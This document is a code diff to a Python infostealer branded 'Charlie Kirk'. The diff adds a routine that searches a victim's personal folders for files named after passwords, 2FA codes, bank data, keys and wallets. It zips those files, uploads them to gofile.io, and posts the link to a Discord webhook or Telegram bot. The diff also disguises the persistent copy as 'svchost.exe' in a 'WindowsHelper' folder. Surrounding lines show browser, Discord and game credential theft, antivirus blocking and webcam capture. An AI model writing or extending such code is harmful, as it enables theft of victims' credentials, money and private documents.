@@ -45,6 +45,7 @@ webcam_success = 0
 process_count = 0
 clipboard_success = 0
 system_info = 0
+personal_files = 0
 roblox_cookies = 0
 bypass_success = 0
 
@@ -321,7 +322,8 @@ def decrypt_old(buff: bytes) -> str:
 localappdata = os.getenv('localappdata')
 appdata = os.getenv('appdata')
 
-output = os.path.join(localappdata, 'Temp', 'KIRK_{}'.format(username))
+output = os.path.join(localappdata, 'Temp', f'KIRK_{username}')
+personalfilesoutput = os.path.join(localappdata, 'Temp', f'KIRK_{username}_PERSONAL')
 
 def isadmin():
     try:
@@ -335,7 +337,10 @@ def askforadmin():
     sys.exit()
 
 zip_ = os.path.join(os.getenv('temp'), os.path.basename(output) + '.zip')
+zip__ = os.path.join(os.getenv('temp'), os.path.basename(personalfilesoutput) + '.zip')
+
 os.makedirs(output, exist_ok=True)
+os.makedirs(personalfilesoutput, exist_ok=True)
 
 ver = platform.version().split('.')[2] 
 plat = platform.system() + " " + '10' if int(ver) < 22000 else platform.system() + " " + '11'
@@ -1459,7 +1464,7 @@ def blockantivirus():
 
 
 def makepath():
-    kirkpath = os.getenv('appdata') + '\\charliekirk'
+    kirkpath = os.getenv('appdata') + '\\WindowsHelper'
     try:
         os.makedirs(kirkpath, exist_ok=True)
         return kirkpath
@@ -1492,6 +1497,71 @@ def collectgeometrydash():
             except:
                 pass
 
+def collectpersonalfiles(maxmb=5):
+    if config.personalfiles:
+        global personal_files
+        print("true")
+
+        filestxt = os.path.join(personalfilesoutput, 'files.txt')
+        userprofile = os.getenv("userprofile")
+        notskipped = []
+        skipped = []
+        maxsize = maxmb * 1024 * 1024
+
+        keywords = ["acc", "secrets", "mfa", "2fa", "password", "token", "tkn", "crypto", "cookie", 
+                    "bank", "credit", "card", "tax", "note", "pass", "passwd", "pswd", "pwd",
+                    "password", "pword", "credentials", "creds", "cred", "login", "logins", "auth", 
+                    "backup", "recovery", "reco", "recov", "code", "key", "keys", "priv", "private", 
+                    "crt", "cert", "certs", "certfile", "api", "cfg", "config", "conf", "id", "journal",
+                    "resume", "address"]
+
+        extensions = [".txt", ".png", ".docx", ".pdf", ".doc", ".log", ".ldb", ".jpg", 
+                      ".jpeg", ".xls", ".xlsx", ".py", ".cpp", ".json", ".zip", 
+                      ".kdbx", ".wallet"]
+        paths = {
+            "Desktop": userprofile + "\\Desktop",
+            "Downloads": userprofile + "\\Downloads",
+            "Documents": userprofile + "\\Documents",
+            "Videos": userprofile + "\\Videos",
+            "Pictures": userprofile + "\\Pictures",
+            "Music": userprofile + "\\Music",
+            "Saved Games": userprofile + "\\Saved Games"                                  
+        }
+        for name, folder in paths.items():
+            if not os.path.exists(folder): 
+                continue
+
+            os.makedirs(os.path.join(personalfilesoutput, name), exist_ok=True)
+
+            for root, _, files_ in os.walk(folder):
+                for file_ in files_:
+                    extension = os.path.splitext(file_.lower())[1]
+                    if not extension in extensions:
+                        continue
+                    if not any(keyword in file_.lower() for keyword in keywords):
+                        continue
+                    file_path = os.path.join(root, file_)
+                    try:
+                        if os.path.getsize(file_path) <= maxsize:
+                            relpath = os.path.relpath(root, folder)
+                            print(relpath)
+                            dest = os.path.join(personalfilesoutput, name, relpath)
+                            os.makedirs(dest, exist_ok=True)
+                            shutil.copy2(file_path, os.path.join(dest, file_))
+                            notskipped.append(file_path)
+                            personal_files += 1
+                        else:
+                            skipped.append(file_path)
+                    except:
+                        continue
+        with open(filestxt, 'w', encoding='utf-8') as f:
+            f.write("Collected:\n")
+            for file_path in notskipped:
+                f.write(f"{file_path}\n")
+            f.write("\nSkipped:\n")
+            for file_path in skipped:
+                f.write(f"{file_path}\n")
+
 
 def collectsteam():
     if config.games:
@@ -1511,7 +1581,7 @@ def collectsteam():
 
 appdpath = makepath()
 if appdpath:
-    copypath = appdpath + '\\dakirk.exe'
+    copypath = appdpath + '\\svchost.exe'
 else:
     copypath = sys.executable
 is_vm = anti_vm()
@@ -1547,7 +1617,7 @@ e3.start()
 
 thread = threading.Thread(target=persistence, args=(copypath,))
 thread.start()
-funcs = [systeminfo, get_webcam, get_clipboard, screenshot, kill, stealchromium, stealchromiumv20, stealgecko, stealdiscordacc, collectminecraft, collectgeometrydash, collectsteam, blockantivirus]
+funcs = [systeminfo, get_webcam, get_clipboard, screenshot, kill, stealchromium, stealchromiumv20, stealgecko, stealdiscordacc, collectminecraft, collectgeometrydash, collectsteam, blockantivirus, collectpersonalfiles]
 
 
 threads = []
@@ -1561,12 +1631,73 @@ for t in threads:
 
 collectroblox()
 zip_folder(output, zip_)
+zip_folder(personalfilesoutput, zip__)
 
 
     
+def sendfilestoc2(file):
+    stores = ['store1', 'store2', 'store3', 'store4', 'store5']
+    with open(file, 'rb') as f:
+        for store in stores:
+            f.seek(0)
+            upload = requests.post(f'https://{store}.gofile.io/uploadFile', files={'file': f})
+            if upload.status_code in [200, 201, 204]:
+                uj = upload.json()
+                #print(upload.text)
+                #print(uj)
+                #print(upload.status_code)
+                download = uj['data']['downloadPage']
+                break
+            else:
+                continue
+
+    if config.type == "discord":
+        webhookurl = config.hook
+        
+        payload = {
+          "content": "||@everyone||",
+          "embeds": [
+            {
+              "fields": [
+                {
+                  "name": ":file_folder: Files Collected",
+                  "value": str(personal_files),
+                  "inline": True
+                },
+                {
+                  "name": ":link: Download Link",
+                  "value": f"||{download}||"
+                }
+              ],
+              "color": 3866871,
+              "author": {
+                "name": "Charlie Kirk"
+              },
+            }
+          ],
+          "username": "Charlie Kirk",
+          "avatar_url": base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3h2aGpzMi9LaXJrZWRHcmFiYmVyL3JlZnMvaGVhZHMvbWFpbi9yZXNvdXJjZXMvY2hhcmxpZSUyMGtpcmsuanBn").decode('utf-8')
+    }
+        r = requests.post(webhookurl, json=payload)
+        # print(r.text)
     
+    if config.type == "telegram":
+        chat_id = config.tg_chat
+        token = config.tg_token
+
+        msg = f'''KIRKED......
+📁 Files: {str(personal_files)}
+🔗 Credentials: {download}
+        '''
+        payload = {
+            'chat_id': chat_id,
+            'text': msg
+        }
+        r = requests.post(f'https://api.telegram.org/bot{token}/sendMessage', data=payload)
+
+
+
 def sendtoc2(file):
-    print(gd_session)
     stores = ['store1', 'store2', 'store3', 'store4', 'store5']
     with open(file, 'rb') as f:
         for store in stores:
@@ -1724,6 +1855,8 @@ def sendtoc2(file):
         }
         r = requests.post(f'https://api.telegram.org/bot{token}/sendMessage', data=payload)
 sendtoc2(zip_)
-
+sendfilestoc2(zip__)
 removefile(zip_)
+removefile(zip__)
 removedir(output)
+removedir(personalfilesoutput)
